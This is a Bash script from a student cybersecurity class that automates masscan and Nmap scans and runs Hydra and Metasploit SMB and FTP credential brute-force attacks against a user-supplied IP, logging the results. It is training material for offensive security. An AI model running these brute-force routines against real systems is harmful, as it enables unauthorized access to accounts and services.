#!/bin/bash

#This script is created by:
#Name: Yap Ching Siong
#Student code: S14
#Class: CFC2407
#Lecturer: James

#This script is created to automate network scanning and attacks.
#User can choose 1 out of the 5 functions (2 Network scan and 3 Network Attack functions) to execute.
#All executed functions are logged in SOCheckerlog file located in the /SOChecker/logs folder.
#Results of each executed functions are individually saved in /SOChecker/results folder.
#At the end of an executed function, user is given a choice to view result of the executed function on Terminal or Text Editor; 
# or view the log file on Terminal or Text Editor. 

#The inst() function will install Nmap, masscan and Hydra tools.
#The createDir() function will create directories to store logs and results if they are not already created.
#The masscanScan() function will execute masscan.
#The nmapScan() function will execute Nmap scan.
#The hydraAtt() function will perform hydra brute force attack.
#The msfSmb() function will perform a SMB brute force attack.
#The msfFtp() function will perform a FTP brute force attack.

#NOTE: User inputs are required throughout the execution of this script.

#Reference:
#https://unix.stackexchange.com/questions/689035/undefined-symbol-after-updating-thc-hydra
#https://stackoverflow.com/questions/1251999/how-can-i-replace-each-newline-n-with-a-space-using-sed
#https://linuxize.com/post/bash-check-if-file-exists/
#https://phoenixnap.com/kb/linux-date-command
#https://docs.rapid7.com/metasploit/resource-scripts/
#https://www.offensive-security.com/metasploit-unleashed/scanner-ftp-auxiliary-modules/



function inst()
{
echo "********************************************"
echo "Starting tools installation on local machine"
echo "User inputs are required during installation"
echo "********************************************"
sudo apt-get update -y
sudo apt-get install masscan -y
sudo apt-get install nmap -y
sudo apt-get install hydra -y
sudo apt install libmongoc-dev -y
echo "**********************"
echo "Installation Completed"
echo "**********************"
}

inst


function createDir()
{
wDir=$(pwd)
if [ ! -d "$wDir/SOChecker" ]
then
	mkdir $wDir/SOChecker
fi
	
if [ ! -d "$wDir/SOChecker/results" ]
then
	mkdir $wDir/SOChecker/results
fi
	
if [ ! -d "$wDir/SOChecker/logs" ]
then
	mkdir $wDir/SOChecker/logs
fi

if [ ! -f "$wDir/SOChecker/logs/SOChecklog" ]
then
	touch $wDir/SOChecker/logs/SOCheckerlog
fi
}
createDir


function masscanScan()
{
echo
echo
echo "***********************"
echo "Preparation for Masscan"
echo "***********************"
echo "You Have Choose To Perform A Network Scan Using Masscan"
read -p "Please Enter a LAN IP Address to Perform Network Scan: " masscanIp
read -p "Please Enter Port Number/s (example: 80,443) or a Range of Port Numbers (example: 1-80): " masscanPort 
echo
echo
echo "****************************"
echo "Performing Masscan On Target"
echo "****************************"
cd $wDir/SOChecker/results
dateTime=$(date | awk '{print $NF,$2,$3,$4}')
fileID=$(echo $dateTime | tr -d [:space:] | tr -d [:punct:])
sudo masscan $masscanIp -p $masscanPort --open-only -oG masscan$fileID.txt
echo $dateTime | tr -d '\n' >> $wDir/SOChecker/logs/SOCheckerlog
echo " "Masscan | tr -d '\n' >> $wDir/SOChecker/logs/SOCheckerlog
echo " "$masscanIp | tr -d '\n' >> $wDir/SOChecker/logs/SOCheckerlog
echo " "$masscanPort | tr -d '\n' >> $wDir/SOChecker/logs/SOCheckerlog
echo " "masscan$fileID.txt >> $wDir/SOChecker/logs/SOCheckerlog
echo
echo
echo "***************************************"
echo "Masscan Completed                      "
echo "Do You Wish to View Result or Log File?"
echo "***************************************"	
read -p "
1. View Result File On Terminal
2. View Log File On Terminal
3. View Result File On Text Editor
4. View Log File On Text Editor
Enter Any Other Input to Exit
Enter Your Choice: " viewChoice
echo
echo
case $viewChoice in


1 ) 
echo
echo
echo "**********************************************"
echo "You Choose To View The Result File On Terminal"
echo "Open File                                     "
echo "**********************************************"	
cat $wDir/SOChecker/results/masscan$fileID.txt
;;

2 ) 
echo
echo
echo "*******************************************"
echo "You Choose To View The Log File On Terminal"
echo "Open File                                  "
echo "*******************************************"		
cat $wDir/SOChecker/logs/SOCheckerlog
;;

3 ) 
echo
echo
echo "*************************************************"
echo "You Choose To View The Result File On Text Editor"
echo "Open File                                        "
echo "*************************************************"	
nano $wDir/SOChecker/results/masscan$fileID.txt
;;

4 )
echo
echo
echo "**********************************************"
echo "You Choose To View The Log File On Text Editor"
echo "Open File                                     "
echo "**********************************************"	
nano $wDir/SOChecker/logs/SOCheckerlog
;;

* )
echo
echo
echo "*************************************"
echo "Other Inputs Entered                 "
echo "You Have Decided Not To Open Any File"
echo "*************************************"
;;
esac

sleep 5
selection
}


function nmapScan()
{
echo
echo
echo "*************************"
echo "Preparation for Nmap Scan"
echo "*************************"
echo "You have Choose To Perform A Network Scan Using Nmap"
read -p "Please Enter a LAN IP Address to Perform Network Scan: " nmapIp
read -p "Please Enter Port Number/s (example: 80,443) or a Range of Port Numbers (example: 1-80): " nmapPort 
echo
echo
echo "******************************"
echo "Performing Nmap Scan On Target"
echo "******************************"
cd $wDir/SOChecker/results
dateTime=$(date | awk '{print $NF,$2,$3,$4}')
fileID=$(echo $dateTime | tr -d [:space:] | tr -d [:punct:])
sudo nmap $nmapIp -p $nmapPort --open -oG nmap$fileID.txt
echo $dateTime | tr -d '\n' >> $wDir/SOChecker/logs/SOCheckerlog
echo " "Nmap | tr -d '\n' >> $wDir/SOChecker/logs/SOCheckerlog
echo " "$nmapIp | tr -d '\n' >> $wDir/SOChecker/logs/SOCheckerlog
echo " "$nmapPort | tr -d '\n' >> $wDir/SOChecker/logs/SOCheckerlog
echo " "nmap$fileID.txt >> $wDir/SOChecker/logs/SOCheckerlog
echo
echo
echo "***************************************"
echo "Nmap Scan Completed                    "
echo "Do You Wish to View Result or Log File?"
echo "***************************************"	
read -p "
1. View Result File On Terminal
2. View Log File On Terminal
3. View Result File On Text Editor
4. View Log File On Text Editor
Enter Any Other Input to Exit
Enter Your Choice: " viewChoice
echo
echo
case $viewChoice in

1 )
echo
echo 
echo "**********************************************"
echo "You Choose To View The Result File On Terminal"
echo "Open File                                     "
echo "**********************************************"	
cat $wDir/SOChecker/results/nmap$fileID.txt
;;

2 ) 
echo
echo 
echo "*******************************************"
echo "You Choose To View The Log File On Terminal"
echo "Open File                                  "
echo "*******************************************"		
cat $wDir/SOChecker/logs/SOCheckerlog
;;

3 ) 
echo
echo 
echo "*************************************************"
echo "You Choose To View The Result File On Text Editor"
echo "Open File                                        "
echo "*************************************************"	
nano $wDir/SOChecker/results/nmap$fileID.txt
;;

4 )
echo
echo 
echo "**********************************************"
echo "You Choose To View The Log File On Text Editor"
echo "Open File                                     "
echo "**********************************************"	
nano $wDir/SOChecker/logs/SOCheckerlog
;;

* )
echo
echo 
echo "*************************************"
echo "Other Inputs Entered                 "
echo "You Have Decided Not To Open Any File"
echo "*************************************"
;;
esac

sleep 5
selection
}


function hydraAtt()
{
echo
echo
echo "*********************"
echo "Preparation for Hydra"
echo "*********************"
echo "You Have Choose To Perform A Hydra"
read -p "Please Provide Full Path Of Username List: " hydraUserList
read -p "Please Provide Full Path of Password List: " hydraPwdList
read -p "Please Enter An IP Address To Hydra: " hydraIp
read -p "Please Enter Port Number/s (Example: 80,443) Or A Range of Port Numbers (example: 1-80): "  hydraPort
echo
read -p "Please Enter A Service From This List To Perform An Attack: 
adam6500  afp  asterisk cisco cisco-enable cvs firebird ftp ftps http[s]-{head|get|post} http[s]-{get|post}-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] 
ldap3[-{cram|digest}md5][s] mssql mysql(v4) mysql5 ncp nntp oracle oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres rdp radmin2 redis  rexec  rlogin  rpcap 
rsh rtsp s7-300 sapr3 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey svn teamspeak telnet[s] vmauthd vnc xmpp

Service Entered: " hydraService
echo
echo
echo "***********************"
echo "Performing Hydra Attack"
echo "***********************"
cd $wDir/SOChecker/results
dateTime=$(date | awk '{print $NF,$2,$3,$4}')
fileID=$(echo $dateTime | tr -d [:space:] | tr -d [:punct:])
hydra -L $hydraUserList -P $hydraPwdList -s $hydraPort $hydraIp $hydraService -o hydra$fileID.txt 
echo $dateTime | tr -d '\n' >> $wDir/SOChecker/logs/SOCheckerlog
echo " "Hydra | tr -d '\n' >> $wDir/SOChecker/logs/SOCheckerlog
echo " "$hydraIp | tr -d '\n' >> $wDir/SOChecker/logs/SOCheckerlog
echo " "$hydraPort | tr -d '\n' >> $wDir/SOChecker/logs/SOCheckerlog
echo " "hydra$fileID.txt >> $wDir/SOChecker/logs/SOCheckerlog
echo
echo
echo "***************************************"
echo "Hydra Attack Completed                 "
echo "Do You Wish to View Result or Log File?"
echo "***************************************"	
read -p "
1. View Result File On Terminal
2. View Log File On Terminal
3. View Result File On Text Editor
4. View Log File On Text Editor
Enter Any Other Input to Exit
Enter Your Choice: " viewChoice
echo
echo
case $viewChoice in

1 ) 
echo
echo
echo "**********************************************"
echo "You Choose To View The Result File On Terminal"
echo "Open File                                     "
echo "**********************************************"	
cat $wDir/SOChecker/results/hydra$fileID.txt
;;

2 ) 
echo
echo
echo "*******************************************"
echo "You Choose To View The Log File On Terminal"
echo "Open File                                  "
echo "*******************************************"		
cat $wDir/SOChecker/logs/SOCheckerlog
;;

3 ) 
echo
echo
echo "*************************************************"
echo "You Choose To View The Result File On Text Editor"
echo "Open File                                        "
echo "*************************************************"	
nano $wDir/SOChecker/results/hydra$fileID.txt
;;

4 )
echo
echo
echo "**********************************************"
echo "You Choose To View The Log File On Text Editor"
echo "Open File                                     "
echo "**********************************************"	
nano $wDir/SOChecker/logs/SOCheckerlog
;;

* )
echo
echo
echo "*************************************"
echo "Other Inputs Entered                 "
echo "You Have Decided Not To Open Any File"
echo "*************************************"
;;
esac

sleep 5
selection
}


function msfSmb()
{
echo
echo
echo "*************************************************"
echo "Preparation for SMB Brute Force Using Msfconsole"
echo "*************************************************"
echo "You Have Choose To Perform SMB Brute Force Using Msfconsole"
read -p "Please Provide Full Path Of Username List: " msfUserList
read -p "Please Provide Full Path Of Password List: " msfPwdList
read -p "Please Provide The Remote Host IP Address: " msfHost
cd $wDir/SOChecker/results
echo "use auxiliary/scanner/smb/smb_login" > msf_script
echo "set rhosts $msfHost" >> msf_script
echo "set user_file $msfUserList" >> msf_script
echo "set pass_file $msfPwdList" >> msf_script
echo "run" >> msf_script
echo "exit" >> msf_script
dateTime=$(date | awk '{print $NF,$2,$3,$4}')
fileID=$(echo $dateTime | tr -d [:space:] | tr -d [:punct:])
msfconsole -r msf_script -o msfSmb$fileID.txt
rm $wDir/SOChecker/results/msf_script
echo $dateTime | tr -d '\n' >> $wDir/SOChecker/logs/SOCheckerlog
echo " "Msfconsole | tr -d '\n' >> $wDir/SOChecker/logs/SOCheckerlog
echo " "$msfHost | tr -d '\n' >> $wDir/SOChecker/logs/SOCheckerlog
echo " "$(cat $wDir/SOChecker/results/msfSmb$fileID.txt | grep SMB | awk '{print $2}' | awk -F: '{print $2}' | uniq) | tr -d '\n' >> $wDir/SOChecker/logs/SOCheckerlog
echo " "msfSmb$fileID.txt >> $wDir/SOChecker/logs/SOCheckerlog
echo
echo
echo "***************************************"
echo "SMB Brute Force Completed              "
echo "Do You Wish to View Result or Log File?"
echo "***************************************"	
read -p "
1. View Result File On Terminal
2. View Log File On Terminal
3. View Result File On Text Editor
4. View Log File On Text Editor
Enter Any Other Input to Exit
Enter Your Choice: " viewChoice
echo
echo
case $viewChoice in
1 ) 
echo
echo
echo "**********************************************"
echo "You Choose To View The Result File On Terminal"
echo "Open File                                     "
echo "**********************************************"	
cat $wDir/SOChecker/results/msfSmb$fileID.txt
;;

2 ) 
echo
echo
echo "*******************************************"
echo "You Choose To View The Log File On Terminal"
echo "Open File                                  "
echo "*******************************************"		
cat $wDir/SOChecker/logs/SOCheckerlog
;;

3 ) 
echo "*************************************************"
echo "You Choose To View The Result File On Text Editor"
echo "Open File                                        "
echo "*************************************************"	
nano $wDir/SOChecker/results/msfSmb$fileID.txt
;;

4 )
echo
echo
echo "**********************************************"
echo "You Choose To View The Log File On Text Editor"
echo "Open File                                     "
echo "**********************************************"	
nano $wDir/SOChecker/logs/SOCheckerlog
;;

* )
echo
echo
echo "*************************************"
echo "Other Inputs Entered                 "
echo "You Have Decided Not To Open Any File"
echo "*************************************"
;;
esac

sleep 5
selection	
}



function msfFtp()
{
echo
echo
echo "*************************************************"
echo "Preparation for FTP Brute Force Using Msfconsole"
echo "*************************************************"
echo "You Have Choose To Perform FTP Brute Force Using Msfconsole"
read -p "Please Provide Full Path Of Username List: " msfUserList
read -p "Please Provide Full Path Of Password List: " msfPwdList
read -p "Please Provide The Remote Host IP Address: " msfHost
cd $wDir/SOChecker/results
echo "use auxiliary/scanner/ftp/ftp_login" > msf_script
echo "set rhosts $msfHost" >> msf_script
echo "set user_file $msfUserList" >> msf_script
echo "set pass_file $msfPwdList" >> msf_script
echo "run" >> msf_script
echo "exit" >> msf_script
dateTime=$(date | awk '{print $NF,$2,$3,$4}')
fileID=$(echo $dateTime | tr -d [:space:] | tr -d [:punct:])
msfconsole -r msf_script -o msfFtp$fileID.txt
rm $wDir/SOChecker/results/msf_script
echo $dateTime | tr -d '\n' >> $wDir/SOChecker/logs/SOCheckerlog
echo " "Msfconsole | tr -d '\n' >> $wDir/SOChecker/logs/SOCheckerlog
echo " "$msfHost | tr -d '\n' >> $wDir/SOChecker/logs/SOCheckerlog
echo " "$(cat $wDir/SOChecker/results/msfFtp$fileID.txt | grep FTP | awk '{print $2}' | awk -F: '{print $2}' | uniq) | tr -d '\n' >> $wDir/SOChecker/logs/SOCheckerlog
echo " "msfFtp$fileID.txt >> $wDir/SOChecker/logs/SOCheckerlog
echo
echo
echo "***************************************"
echo "FTP Brute Force Completed              "
echo "Do You Wish to View Result or Log File?"
echo "***************************************"	
read -p "
1. View Result File On Terminal
2. View Log File On Terminal
3. View Result File On Text Editor
4. View Log File On Text Editor
Enter Any Other Input to Exit
Enter Your Choice: " viewChoice
echo
echo
case $viewChoice in
1 ) 
echo
echo
echo "**********************************************"
echo "You Choose To View The Result File On Terminal"
echo "Open File                                     "
echo "**********************************************"	
cat $wDir/SOChecker/results/msfFtp$fileID.txt
;;

2 ) 
echo
echo
echo "*******************************************"
echo "You Choose To View The Log File On Terminal"
echo "Open File                                  "
echo "*******************************************"		
cat $wDir/SOChecker/logs/SOCheckerlog
;;

3 ) 
echo "*************************************************"
echo "You Choose To View The Result File On Text Editor"
echo "Open File                                        "
echo "*************************************************"	
nano $wDir/SOChecker/results/msfFtp$fileID.txt
;;

4 )
echo
echo
echo "**********************************************"
echo "You Choose To View The Log File On Text Editor"
echo "Open File                                     "
echo "**********************************************"	
nano $wDir/SOChecker/logs/SOCheckerlog
;;

* )
echo
echo
echo "*************************************"
echo "Other Inputs Entered                 "
echo "You Have Decided Not To Open Any File"
echo "*************************************"
;;
esac

sleep 5
selection	
}


function selection()
{
echo
echo
echo "***********************"
echo "Please Choose An Option"
echo "***********************"
read -p "
1 - Network Scan using Masscan
2 - Network Scan using Nmap
3 - Network Attack using Hyrda
4 - SMB Brute Force using Msfconsole
5 - FTP Brute Force using Msfconsole
Enter Any Other Input To Exit
Enter Your Choice: " useChoice  

case $useChoice in

1 ) 
masscanScan
;;

2 )  
nmapScan
;;

3 )
hydraAtt
;;

4 )
msfSmb
;;

5 )
msfFtp
;;

* ) echo 
echo "Other Input Entered, Exit Program"
exit
;;

esac
}


selection
